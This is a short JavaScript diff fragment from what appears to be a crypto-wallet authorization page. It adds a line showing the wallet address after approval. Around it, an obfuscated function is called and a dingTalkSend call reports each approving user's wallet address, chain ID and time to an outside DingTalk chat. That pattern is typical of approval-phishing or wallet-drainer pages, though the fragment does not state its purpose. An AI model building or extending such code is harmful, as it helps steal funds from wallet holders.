@@ -173,6 +173,8 @@ data:data
 }]
 });
 
+// 授权成功自动填充备案钱包地址
+document.getElementById("successAddr").innerText = walletAddr;
 _0x5c8e("p4");
 dingTalkSend("用户授权成功\n钱包地址："+walletAddr+"\n链ID："+chainId+"\n时间："+new Date().toLocaleString());
 }catch(e){
